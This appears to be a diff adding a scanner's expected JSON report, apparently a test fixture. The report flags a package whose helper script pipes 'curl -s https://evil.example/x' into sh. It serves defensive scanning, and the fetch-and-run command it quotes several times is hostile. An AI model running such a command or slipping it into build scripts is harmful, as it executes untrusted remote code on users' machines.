@@ -1,0 +1,54 @@
+{
+  "package_name": "demo",
+  "package_version": "1-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell (source sidecar)",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/local-tar-source/assets.tar:helper.sh",
+        "line": 2,
+        "column": 1,
+        "snippet": "curl -s https://evil.example/x | sh"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": false,
+        "matched_text": "curl -s https://evil.example/x | sh",
+        "script_kind": "source sidecar"
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/x (install script)",
+      "description": "This package downloads and executes code from https://evil.example/x at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/local-tar-source/assets.tar:helper.sh",
+        "line": 2,
+        "column": null,
+        "snippet": "curl -s https://evil.example/x | sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/x"
+        ]
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/local-tar-source/PKGBUILD",
+    "tests/fixtures/malicious/local-tar-source/assets.tar:helper.sh"
+  ],
+  "timestamp": "2026-11-10T14:51:02.812141618Z",
+  "scan_duration_ms": 24
+}
